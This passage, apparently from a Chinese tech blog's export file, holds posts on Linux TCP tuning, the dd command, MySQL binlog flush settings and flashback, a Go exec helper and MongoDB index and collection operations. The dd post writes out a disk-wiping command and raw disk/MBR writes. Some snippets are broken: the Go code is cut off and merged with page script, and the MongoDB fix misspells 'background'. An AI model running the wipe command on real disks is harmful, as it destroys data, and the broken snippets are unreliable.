让参数生效。 参数说明:1234567891011121314151617181920212223242526272829303132net.ipv4.tcp_keepalive_time = 1200 #表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。net.ipv4.ip_local_port_range = 10000 65000 #表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为10000到65000。（注意：这里不要将最低值设的太低，否则可能会占用掉正常的端口！）net.ipv4.tcp_max_syn_backlog = 8192 #表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。net.ipv4.tcp_max_tw_buckets = 6000 #表示系统同时保持TIME_WAIT的最大数量，如果超过这个数字，TIME_WAIT将立刻被清除并打印警告信息。默认180000，改为6000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于 Squid，效果却不大。此项参数可以控制TIME_WAIT的最大数量，避免Squid服务器被大量的TIME_WAIT拖死。内核其他TCP参数说明：net.ipv4.tcp_max_syn_backlog = 65536 #记录的那些尚未收到客户端确认信息的连接请求的最大值。对于有128M内存的系统而言，缺省值是1024，小内存的系统则是128。net.core.netdev_max_backlog = 32768 #每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目。net.core.somaxconn = 32768 #web应用中listen函数的backlog默认会给我们内核参数的net.core.somaxconn限制到128，而nginx定义的NGX_LISTEN_BACKLOG默认为511，所以有必要调整这个值。net.core.wmem_default = 8388608net.core.rmem_default = 8388608net.core.rmem_max = 16777216 #最大socket读buffer,可参考的优化值:873200net.core.wmem_max = 16777216 #最大socket写buffer,可参考的优化值:873200net.ipv4.tcp_timestsmps = 0 #时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号。时间戳能够让内核接受这种“异常”的数据包。这里需要将其关掉。net.ipv4.tcp_synack_retries = 2 #为了打开对端的连接，内核需要发送一个SYN并附带一个回应前面一个SYN的ACK。也就是所谓三次握手中的第二次握手。这个设置决定了内核放弃连接之前发送SYN+ACK包的数量。net.ipv4.tcp_syn_retries = 2 #在内核放弃建立连接之前发送SYN包的数量。net.ipv4.tcp_tw_reuse = 1 # 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接。net.ipv4.tcp_wmem = 8192 436600 873200 # TCP写buffer,可参考的优化值: 8192 436600 873200net.ipv4.tcp_rmem = 32768 436600 873200 # TCP读buffer,可参考的优化值: 32768 436600 873200net.ipv4.tcp_mem = 94500000 91500000 92700000 # 同样有3个值,意思是:net.ipv4.tcp_mem[0]:低于此值，TCP没有内存压力。net.ipv4.tcp_mem[1]:在此值下，进入内存压力阶段。net.ipv4.tcp_mem[2]:高于此值，TCP拒绝分配socket。上述内存单位是页，而不是字节。可参考的优化值是:786432 1048576 1572864net.ipv4.tcp_max_orphans = 3276800 #系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。如果超过这个数字，连接将即刻被复位并打印出警告信息。这个限制仅仅是为了防止简单的DoS攻击，不能过分依靠它或者人为地减小这个值，更应该增加这个值(如果增加了内存之后)。net.ipv4.tcp_fin_timeout = 30 #如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。对端可以出错并永远不关闭连接，甚至意外当机。缺省值是60秒。2.2 内核的通常值是180秒，你可以按这个设置，但要记住的是，即使你的机器是一个轻载的WEB服务器，也有因为大量的死套接字而内存溢出的风险，FIN- WAIT-2的危险性比FIN-WAIT-1要小，因为它最多只能吃掉1.5K内存，但是它们的生存期长些。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux dd 命令详解]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-dd%2F</url>
    <content type="text"><![CDATA[一直对发型和身材不满意的人，有一个共同点：不肯承认这是脸的问题。 前言dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。 注意：指定数字的地方若以下列字符结尾，则乘以相应的数字 b=512 c=1 k=1024 w=2 dd 命令例子dd 创建测试文件12语法：CODE:[Copy to clipboard]dd 〔选项〕 123456789101112131415161718192021if =输入文件(或设备名称)。of =输出文件(或设备名称)。ibs = bytes 一次读取bytes字节，即读入缓冲区的字节数。skip = blocks 跳过读入缓冲区开头的ibs*blocks块。obs = bytes 一次写入bytes字节，即写 入缓冲区的字节数。bs = bytes 同时设置读/写缓冲区的字节数(等于设置obs和obs)。cbs = bytes 一次转换bytes字节。count = blocks 只拷贝输入的blocks块。conv = ASCII 把EBCDIC码转换为ASCII码。conv = ebcdic 把ASCII码转换为EBCDIC码。conv = ibm 把ASCII码转换为alternate EBCDIC码。conv = blick 把变动位转换成固定字符。conv = ublock 把固定们转换成变动位conv = ucase 把字母由小写变为大写。conv = lcase 把字母由大写变为小写。conv = notrunc 不截短输出文件。conv = swab 交换每一对输入字节。conv = noerror 出错时不停止处理。conv = sync 把每个输入记录的大小都调到ibs的大小(用ibs填充)。fdformat命令低级格式化软盘。 创建一个2G的文件1dd if=/dev/zero of=/tmp/test bs=1M count=2048 测试硬盘读写速度通过两个命令输出的执行时间，可以计算出测试硬盘的读／写速度:12dd if=/root/1Gb.file bs=64k | dd of=/dev/nulldd if=/dev/zero of=/root/1Gb.file bs=1024 count=1000000 销毁磁盘数据1dd if=/dev/urandom of=/dev/hda1 注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。 确定硬盘的最佳块大小1234dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.filedd if=/dev/zero bs=2048 count=500000 of=/root/1Gb.filedd if=/dev/zero bs=4096 count=250000 of=/root/1Gb.filedd if=/dev/zero bs=8192 count=125000 of=/root/1Gb.file 通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。 备份与恢复MBR备份磁盘开始的512个字节大小的MBR信息到指定文件：12dd if=/dev/hda of=/root/image count=1 bs=512# count=1指仅拷贝一个块；bs=512指块大小为512个字节。 将备份的MBR信息写到磁盘开始部分1dd if=/root/image of=/dev/had 拷贝内存内容到硬盘12dd if=/dev/mem of=/root/mem.bin bs=1024# 指定块大小为1k 修复硬盘123dd if=/dev/sda of=/dev/sda或者dd if=/dev/hda of=/dev/hda 将一个很大的视频文件中的第i个字节的值改成0x41（也就是大写字母A的ASCII值）1echo A | dd of=bigfile seek=$i bs=1 count=1 conv=notrunc 结尾总结/dev/null和/dev/zero的区别 /dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！ /dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！ /dev/null，它是空设备，也称为位桶（bit bucket）。任何写入它的输出都会被抛弃。如果不想让消息以标准输出显示或写入文件，那么可以将消息重定向到位桶。 /dev/zero,是一个输入设备，你可你用它来初始化文件。 /dev/zero,是一个输入设备，你可你用它来初始化文件。 /dev/zero，该设备无穷尽地提供0，可以使用任何你需要的数目——设备提供的要多的多。他可以用于向设备或文件写入字符串0。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改sync_binlog innodb_flush_log_at_trx_commit和sync_binlog参数 提高写入速度]]></title>
    <url>%2F2019%2F04%2F22%2Fsync-binlog-innodb-flush-log-at-trx-commit%2F</url>
    <content type="text"><![CDATA[胸小的姑娘一般脾气都特大，胸大的姑娘一般脾气都特好，因为古语有云：穷凶极恶有容乃大！ 前言innodb_flush_log_at_trx_commit和sync_binlog 两个参数是控制MySQL 磁盘写入策略以及数据安全性的关键参数。 详细innodb_flush_log_at_trx_commit 如果innodb_flush_log_at_trx_commit设置为0，log buffer将每秒一次地写入log file中，并且log file的flush(刷到磁盘)操作同时进行，该模式下，在事务提交的时候，不会主动触发写入磁盘的操作。 如果innodb_flush_log_at_trx_commit设置为1，每次事务提交时MySQL都会把log buffer的数据写入log file，并且flush(刷到磁盘)中去。 如果innodb_flush_log_at_trx_commit设置为2，每次事务提交时MySQL都会把log buffer的数据写入log file.但是flush(刷到磁盘)操作并不会同时进行。该模式下,MySQL会每秒执行一次 flush(刷到磁盘)操作。 注：由于进程调度策略问题,这个”每秒执行一次 flush(刷到磁盘)操作”并不是保证100%的”每秒”。 sync_binlogsync_binlog 的默认值是0，像操作系统刷其他文件的机制一样，MySQL不会同步到磁盘中去而是依赖操作系统来刷新binary log。 当sync_binlog =N (N>0) ，MySQL 在每写 N次 二进制日志binary log时，会使用fdatasync()函数将它的写二进制日志binary log同步到磁盘中去。 如果启用了autocommit，那么每一个语句statement就会有一次写操作；否则每个事务对应一个写操作。 由此可见，当两个参数设置为双1的时候，写入性能最差，sync_binlog=N (N>1 ) and innodb_flush_log_at_trx_commit=2 时，(在当前模式下)MySQL的写操作才能达到最高性能。 当innodb_flush_log_at_trx_commit和sync_binlog 都为 1 时是最安全的，在mysqld 服务崩溃或者服务器主机crash的情况下，binary log 只有可能丢失最多一个语句或者一个事务。但是鱼与熊掌不可兼得，双11 会导致频繁的io操作，因此该模式也是最慢的一种方式。 当innodb_flush_log_at_trx_commit设置为0，mysqld进程的崩溃会导致上一秒钟所有事务数据的丢失。 当innodb_flush_log_at_trx_commit设置为2，只有在操作系统崩溃或者系统掉电的情况下，上一秒钟所有事务数据才可能丢失。 双1适合数据安全性要求非常高，而且磁盘IO写能力足够支持业务，比如订单,交易,充值,支付消费系统。 推荐的做法是 innodb_flush_log_at_trx_commit=2 ，sync_binlog=N (N为500 或1000) 且使用带蓄电池后备电源的缓存cache，防止系统断电异常。 系统性能和数据安全是业务系统高可用稳定的必要因素。我们对系统的优化需要寻找一个平衡点，合适的才是最好的，根据不同的业务场景需求，可以将两个参数做组合调整，以便是db系统的性能达到最优化。 PS: 两个都为1的时候，导入数据约18分钟，优化后导入整库约3分钟。12innodb_flush_log_at_trx_commit=2 sync_binlog=1000 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[golang 执行 command]]></title>
    <url>%2F2019%2F04%2F20%2Fgo-command%2F</url>
    <content type="text"><![CDATA[你并不是一无所有，至少你有肉。 代码golang中会经常遇到要 fork 子进程的需求。go 标准库为我们封装了 os/exec标准包,当我们要运行外部命令时应该优先使用这个库。这里我简单结合context 和 Cmd 模块写一个通用的执行 command 方法。代码如下:12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( "context" "os/exec" "syscall")func RunCmd(ctx context.Context, cmd *exec.Cmd) error { cmd.SysProcAttr = &syscall.SysProcAttr{ Setpgid: true, } if err := cmd.Start(); err != nil { return err } errCh := make(chan error, 1) go func() { errCh { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL闪回原理与实战]]></title>
    <url>%2F2019%2F04%2F19%2Fmysql-flashback-priciple-and-practice%2F</url>
    <content type="text"><![CDATA[能用钱解决的问题都不是问题，可问题是我是穷人。 DBA或开发人员，有时会误删或者误更新数据，如果是线上环境并且影响较大，就需要能快速回滚。传统恢复方法是利用备份重搭实例，再应用去除错误sql后的binlog来恢复数据。此法费时费力，甚至需要停机维护，并不适合快速回滚。也有团队利用LVM快照来缩短恢复时间，但快照的缺点是会影响mysql的性能。 MySQL闪回(flashback)利用binlog直接进行回滚，能快速恢复且不用停机。本文将介绍闪回原理，给出笔者的实战经验，并对现存的闪回工具作比较。 开胃菜某天，小明因种种原因，误删了大批线上用户表的数据。他急忙找到公司DBA请求帮助，“客服电话已被打爆，大量用户投诉无法登陆，领导非常恼火。请问多久能恢复数据？”DBA一脸懵逼，沉默十秒后，伸出一根手指。“你的意思是一分钟就能恢复？太好了。”小明终于有些放松，露出了一丝笑容。“不，我们中有个人将会离开公司。”DBA沉痛的说道。 勿让悲剧发生，尽早将此文转给公司DBA。 闪回原理binlog概述 MySQL binlog以event的形式，记录了MySQL server从启用binlog以来所有的变更信息，能够帮助重现这之间的所有变化。MySQL引入binlog主要有两个目的：一是为了主从复制；二是某些备份还原操作后需要重新应用binlog。 有三种可选的binlog格式，各有优缺点： statement：基于SQL语句的模式，binlog数据量小，但是某些语句和函数在复制过程可能导致数据不一致甚至出错； row：基于行的模式，记录的是行的完整变化。很安全，但是binlog会比其他两种模式大很多； mixed：混合模式，根据语句来选用是statement还是row模式； 利用binlog闪回，需要将binlog格式设置为row。row模式下，一条使用innodb的insert会产生如下格式的binlog： 123456789101112131415161718# at 1129#161225 23:15:38 server id 3773306082 end_log_pos 1197 Query thread_id=1903021 exec_time=0 error_code=0SET TIMESTAMP=1482678938/*!*/;BEGIN/*!*/;# at 1197#161225 23:15:38 server id 3773306082 end_log_pos 1245 Table_map: `test`.`user` mapped to number 290# at 1245#161225 23:15:38 server id 3773306082 end_log_pos 1352 Write_rows: table id 290 flags: STMT_END_FBINLOG 'muJfWBPiFOjgMAAAAN0EAAAAACIBAAAAAAEABHRlc3QABHVzZXIAAwMPEQMeAAACmuJfWB7iFOjgawAAAEgFAAAAACIBAAAAAAEAAgAD//gBAAAABuWwj+i1tVhK1hH4AgAAAAblsI/pkrFYStYg+AMAAAAG5bCP5a2ZWE/onPgEAAAABuWwj+adjlhNeAD4BQAAAAJ0dFhRYJM='/*!*/;# at 1352#161225 23:15:38 server id 3773306082 end_log_pos 1379 Xid = 5327954COMMIT/*!*/; 闪回原理 既然binlog以event形式记录了所有的变更信息，那么我们把需要回滚的event，从后往前回滚回去即可。 对于单个event的回滚，我们以表test.user来演示原理 12345678mysql> show create table test.user\G*************************** 1. row *************************** Table: userCreate Table: CREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(10) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 对于delete操作，我们从binlog提取出delete信息，生成的回滚语句是insert。(注：为了方便解释，我们用binlog2sql将原始binlog转化成了可读SQL) 12原始：DELETE FROM `test`.`user` WHERE `id`=1 AND `name`='小赵';回滚：INSERT INTO `test`.`user`(`id`, `name`) VALUES (1, '小赵'); 对于insert操作，回滚SQL是delete。 12原始：INSERT INTO `test`.`user`(`id`, `name`) VALUES (2, '小钱');回滚：DELETE FROM `test`.`user` WHERE `id`=2 AND `name`='小钱'; 对于update操作，回滚sql应该交换SET和WHERE的值。 12原始：UPDATE `test`.`user` SET `id`=3, `name`='小李' WHERE `id`=3 AND `name`='小孙';回滚：UPDATE `test`.`user` SET `id`=3, `name`='小孙' WHERE `id`=3 AND `name`='小李'; TIPS 闪回的目标：快速筛选出真正需要回滚的数据。 先根据库、表、时间做一次过滤，再根据位置做更准确的过滤。 由于数据一直在写入，要确保回滚sql中不包含其他数据。可根据是否是同一事务、误操作行数、字段值的特征等等来帮助判断。 执行回滚sql时如有报错，需要查实具体原因，一般是因为对应的数据已发生变化。由于是严格的行模式，只要有唯一键(包括主键)存在，就只会报某条数据不存在的错，不必担心会更新不该操作的数据。业务如果有特殊逻辑，数据回滚可能会带来影响。 如果只回滚某张表，并且该表有关联表，关联表并不会被回滚，需与业务方沟通清楚。 哪些数据需要回滚，让业务方来判断！闪回工具MySQL闪回特性最早由阿里彭立勋开发，彭在2012年给官方提交了一个patch，并对闪回设计思路做了说明(设计思路很有启发性，强烈推荐阅读)。但是因为种种原因，业内安装这个patch的团队至今还是少数，真正应用到线上的更是少之又少。彭之后，又有多位人员针对不同mysql版本不同语言开发了闪回工具，原理用的都是彭的思路。 我将这些闪回工具按实现方式分成了三类。 第一类是以patch形式集成到官方工具mysqlbinlog中。以彭提交的patch为代表。 优点 上手成本低。mysqlbinlog原有的选项都能直接利用，只是多加了一个闪回选项。闪回特性未来有可能被官方收录。 支持离线解析。 缺点 兼容性差、项目活跃度不高。由于binlog格式的变动，如果闪回工具作者不及时对补丁升级，则闪回工具将无法使用。目前已有多位人员分别针对mysql5.5，5.6，5.7开发了patch，部分项目代码公开，但总体上活跃度都不高。 难以添加新功能，实战效果欠佳。在实战中，经常会遇到现有patch不满足需求的情况，比如要加个表过滤，很简单的一个需求，代码改动也不会大，但对大部分DBA来说，改mysql源码还是很困难的事。 安装稍显麻烦。需要对mysql源码打补丁再编译生成。 这些缺点，可能都是闪回没有流行开来的原因。 第二类是独立工具，通过伪装成slave拉取binlog来进行处理。以binlog2sql为代表。 优点 兼容性好。伪装成slave拉binlog这项技术在业界应用的非常广泛，多个开发语言都有这样的活跃项目，MySQL版本的兼容性由这些项目搞定，闪回工具的兼容问题不再突出。 添加新功能的难度小。更容易被改造成DBA自己喜欢的形式。更适合实战。 安装和使用简单。 缺点 必须开启MySQL server。 第三类是简单脚本。先用mysqlbinlog解析出文本格式的binlog，再根据回滚原理用正则进行匹配并替换。 优点 脚本写起来方便，往往能快速搞定某个特定问题。 安装和使用简单。 支持离线解析。 缺点 通用性不好。 可靠性不好。 就目前的闪回工具而言，线上环境的闪回，笔者建议使用binlog2sql，离线解析使用mysqlbinlog。 关于DDL的flashback本文所述的flashback仅针对DML语句的快速回滚。但如果误操作是DDL的话，是无法利用binlog做快速回滚的，因为即使在row模式下，binlog对于DDL操作也不会记录每行数据的变化。要实现DDL快速回滚，必须修改MySQL源码，使得在执行DDL前先备份老数据。目前有多个mysql定制版本实现了DDL闪回特性，阿里林晓斌团队提交了patch给MySQL官方，MariaDB预计在不久后加入包含DDL的flashback特性。DDL闪回的副作用是会增加额外存储。考虑到其应用频次实在过低，本文不做详述，有兴趣的同学可以自己去了解，重要的几篇文章我在参考资料中做了引用。 参考资料[1] MySQL Internals Manual, Chapter 20 The Binary Log [2] 彭立勋，MySQL下实现闪回的设计思路 [3] Lixun Peng, Provide the flashback feature by binlog [4] 王广友，mysqlbinlog flashback 5.6完全使用手册与原理 [5] 姜承尧, 拿走不谢，Flashback for MySQL 5.7 [6] 林晓斌, MySQL闪回方案讨论及实现 [7] xiaobin lin, flashback from binlog for MySQL [8] mariadb.com, AliSQL and some features that have made it into MariaDB Server [9] danfengcao, binlog2sql: Parse MySQL binlog to SQL you want 文章来自MySQL闪回原理与实战 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB 添加索引引发的故障]]></title>
    <url>%2F2019%2F04%2F17%2Fmongodb-creata-index%2F</url>
    <content type="text"><![CDATA[咸鱼翻身，还是咸鱼。 原因线上MongoDB服务器资源报警，查看MongoDB log发现有大量的查询没有走索引。于是添加索引 操作具体的查询语句列子:1command feeds.content_medium_hismatch command: count { count: "content_medium_hismatch", query: { update_time: { $gte: 1384099200000, $lt: 1384185600000 }, content_type_id: "28" } } planSummary: IXSCAN { content_type_id: 1 } keysExamined:191146 docsExamined:191146 fromMultiPlanner:1 replanned:1 numYields:10767 reslen:44 locks:{ Global: { acquireCount: { r: 21536 } }, Database: { acquireCount: { r: 10768 } }, Collection: { acquireCount: { r: 10768 } } } protocol:op_query 84011ms 通过MongoDB explain()123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122repset:PRIMARY> db.content_medium_hismatch.find({ count: "content_medium_hismatch", query: { update_time: { $gte: 1384099200000, $lt: 1384185600000 }, content_type_id: "28" }}).explain(){ "queryPlanner" : { "plannerVersion" : 1, "namespace" : "feeds.content_medium_hismatch", "indexFilterSet" : false, "parsedQuery" : { "$and" : [ { "count" : { "$eq" : "content_medium_hismatch" } }, { "query" : { "$eq" : { "update_time" : { "$gte" : 1384099200000, "$lt" : 1384185600000 }, "content_type_id" : "28" } } } ] }, "winningPlan" : { "stage" : "COLLSCAN", "filter" : { "$and" : [ { "count" : { "$eq" : "content_medium_hismatch" } }, { "query" : { "$eq" : { "update_time" : { "$gte" : 1384099200000, "$lt" : 1384185600000 }, "content_type_id" : "28" } } } ] }, "direction" : "forward" }, "rejectedPlans" : [ ] }, "serverInfo" : { "host" : "public-ops-mongodb2.wj.babytree-ops.org", "port" : 29001, "version" : "3.4.2", "gitVersion" : "3f76e40c105fc223b3e5aac3e20dcd026b83b38b" }, "ok" : 1}repset:PRIMARY> repset:PRIMARY> db.content_medium_hismatch.find({ count: "content_medium_hismatch", query: { update_time: { $gte: 1384099200000, $lt: 1384185600000 }, content_type_id: "28" }}).explain(){ "queryPlanner" : { "plannerVersion" : 1, "namespace" : "feeds.content_medium_hismatch", "indexFilterSet" : false, "parsedQuery" : { "$and" : [ { "count" : { "$eq" : "content_medium_hismatch" } }, { "query" : { "$eq" : { "update_time" : { "$gte" : 1384099200000, "$lt" : 1384185600000 }, "content_type_id" : "28" } } } ] }, "winningPlan" : { "stage" : "COLLSCAN", "filter" : { "$and" : [ { "count" : { "$eq" : "content_medium_hismatch" } }, { "query" : { "$eq" : { "update_time" : { "$gte" : 1384099200000, "$lt" : 1384185600000 }, "content_type_id" : "28" } } } ] }, "direction" : "forward" }, "rejectedPlans" : [ ] }, "serverInfo" : { "host" : "public-ops-mongodb2.wj.babytree-ops.org", "port" : 29001, "version" : "3.4.2", "gitVersion" : "3f76e40c105fc223b3e5aac3e20dcd026b83b38b" }, "ok" : 1} 于是很鲁莽的添加了索引操作1db.content_medium_hismatch.ensureIndex({update_time: 1, content_type_id: 1}) 发现时间很长，于是就crtl+c中断操作，在执行登录MongoDB shell 发现操作都堵塞。执行tail -f /data/repset/log/mongod.log发现12345678910112019-04-04T16:54:54.984+0800 I INDEX [conn2744778] build index on: feeds.content_medium_hismatch properties: { v: 2, key: { update_time: 1.0, content_type_id: 1.0 }, name: "update_time_1_content_type_id_1", ns: "feeds.content_medium_hismatch" }Index Build: 33461300/138238312 0%……Index Build: 33461300/138238312 99%Index: (2/3) BTree Bottom Up Progress: 99135500/138238312 1%……Index: (2/3) BTree Bottom Up Progress: 99135500/138238312 71%2019-04-04T18:22:05.817+0800 I INDEX [conn2744778] build index done. scanned 138238312 total records. 5230 secs 还在执行创建索引操作。经过排查发现。MongoDB 不是和MySQL一样。中断了就不执行了。而且MongoDB 在前台创建索引操作。会把整个服务阻塞。直到索引创建成功，才会放开阻塞。这样操作直接造成了业务不可用状态，时间整整87分钟。鲁莽惹的祸。 总结当系统已有大量数据时，创建索引就是个非常耗时的活，我们可以在后台执行，只需指定”backgroud: true”即可。1db.content_medium_hismatch.ensureIndex({update_time: 1, content_type_id: 1}, {backgroud: true}) 回顾最后在看一下如此之大的代价创建的索引之后使用的情况123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175repset:PRIMARY> db.content_medium_hismatch.find({ update_time: { $gte: 1384099200000, $lt: 1384185600000 }, content_type_id: "28" }).explain(){ "queryPlanner" : { "plannerVersion" : 1, "namespace" : "feeds.content_medium_hismatch", "indexFilterSet" : false, "parsedQuery" : { "$and" : [ { "content_type_id" : { "$eq" : "28" } }, { "update_time" : { "$lt" : 1384185600000 } }, { "update_time" : { "$gte" : 1384099200000 } } ] }, "winningPlan" : { "stage" : "FETCH", "inputStage" : { "stage" : "IXSCAN", "keyPattern" : { "update_time" : 1, "content_type_id" : 1 }, "indexName" : "update_time_1_content_type_id_1", "isMultiKey" : false, "multiKeyPaths" : { "update_time" : [ ], "content_type_id" : [ ] }, "isUnique" : false, "isSparse" : false, "isPartial" : false, "indexVersion" : 2, "direction" : "forward", "indexBounds" : { "update_time" : [ "[1384099200000.0, 1384185600000.0)" ], "content_type_id" : [ "[\"28\", \"28\"]" ] } } }, "rejectedPlans" : [ { "stage" : "FETCH", "filter" : { "content_type_id" : { "$eq" : "28" } }, "inputStage" : { "stage" : "IXSCAN", "keyPattern" : { "update_time" : 1 }, "indexName" : "update_time_1", "isMultiKey" : false, "multiKeyPaths" : { "update_time" : [ ] }, "isUnique" : false, "isSparse" : false, "isPartial" : false, "indexVersion" : 2, "direction" : "forward", "indexBounds" : { "update_time" : [ "[1384099200000.0, 1384185600000.0)" ] } } }, { "stage" : "FETCH", "filter" : { "$and" : [ { "update_time" : { "$lt" : 1384185600000 } }, { "update_time" : { "$gte" : 1384099200000 } } ] }, "inputStage" : { "stage" : "IXSCAN", "keyPattern" : { "content_type_id" : 1 }, "indexName" : "content_type_id_1", "isMultiKey" : false, "multiKeyPaths" : { "content_type_id" : [ ] }, "isUnique" : false, "isSparse" : false, "isPartial" : false, "indexVersion" : 2, "direction" : "forward", "indexBounds" : { "content_type_id" : [ "[\"28\", \"28\"]" ] } } }, { "stage" : "FETCH", "filter" : { "$and" : [ { "update_time" : { "$lt" : 1384185600000 } }, { "update_time" : { "$gte" : 1384099200000 } } ] }, "inputStage" : { "stage" : "IXSCAN", "keyPattern" : { "content_type_id" : 1, "content_id" : 1 }, "indexName" : "content_type_id_1_content_id_1", "isMultiKey" : false, "multiKeyPaths" : { "content_type_id" : [ ], "content_id" : [ ] }, "isUnique" : true, "isSparse" : false, "isPartial" : false, "indexVersion" : 2, "direction" : "forward", "indexBounds" : { "content_type_id" : [ "[\"28\", \"28\"]" ], "content_id" : [ "[MinKey, MaxKey]" ] } } } ] }, "serverInfo" : { "host" : "public-ops-mongodb2.wj.babytree-ops.org", "port" : 29001, "version" : "3.4.2", "gitVersion" : "3f76e40c105fc223b3e5aac3e20dcd026b83b38b" }, "ok" : 1} 发现正常走了索引。总算没有白做。可是代价太大了。这个教训告诉我，在不熟悉的数据库操作一定要慎重。针对线上操作，一定要再三慎重。引以为戒！ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB 实现 MySQL 的 INSERT INTO SELECT]]></title>
    <url>%2F2019%2F04%2F15%2Fmongodb-inset-into-select%2F</url>
    <content type="text"><![CDATA[说金钱是罪恶，都在捞；说美女是祸水，都想要；说高处不胜寒，都在爬；说烟酒伤身体，都不戒；说天堂最美好，都不去！ 原因公司业务有要将一个集合需要更改名称，需要DBA做配合 操作流程 停止入库 确认已经把库入数据审完 重命名collections 创建新集合索引db.antispam_resource.renameCollection("antispam_resource_20190415");db.createCollection("antispam_resource");db.antispam_resource.ensureIndex({createTs: 1, groupId: 1});db.antispam_resource.ensureIndex({handleTs: 1, opUserId: 1});db.antispam_resource.getIndexes(); 新数据入库 看审核后台是否有新数据入库并审核 把最近1个月数据(antispam_resource_20190415)导入到antispam_resource 完毕 操作查看一下原集合数据量1db.antispam_resource.find().count(); 进行更改名称操作1db.antispam_resource.renameCollection("antispam_resource_20190415") 进行创建索引123db.antispam_resource.ensureIndex({createTs: 1, groupId: 1});db.antispam_resource.ensureIndex({handleTs: 1, opUserId: 1});db.antispam_resource.getIndexes(); 进行操作 MongoDB 版本的 INSERT INTO SELECT12345示例:db.antispam_resource.find().forEach(function(doc){ print(doc._id); db.antispam_resource.insert(doc)} ); 操作详细步骤查看原集合大于4月1号的数据123456789101112mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { $gte: NumberLong(1554048000) }}).count()2726271mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { $lte: NumberLong(1554048000) }}).count()22264682mgset-11469021:PRIMARY> db.antispam_resource.find().count()27824mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { $gte: NumberLong(1554048000) }}).count()27861mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { $lte: NumberLong(1554048000) }}).count()0mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { $gte: NumberLong(1554048000) }}).count()28074 进行操作12mgset-11469021:PRIMARY> var docs = db.antispam_resource_20190415.find({createTs: { $gte: NumberLong(1554048000) }});mgset-11469021:PRIMARY> docs.forEach( function(d){ db.antispam_resource.insert(d) }); 数据在慢慢插入到新的集合中 1234mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { 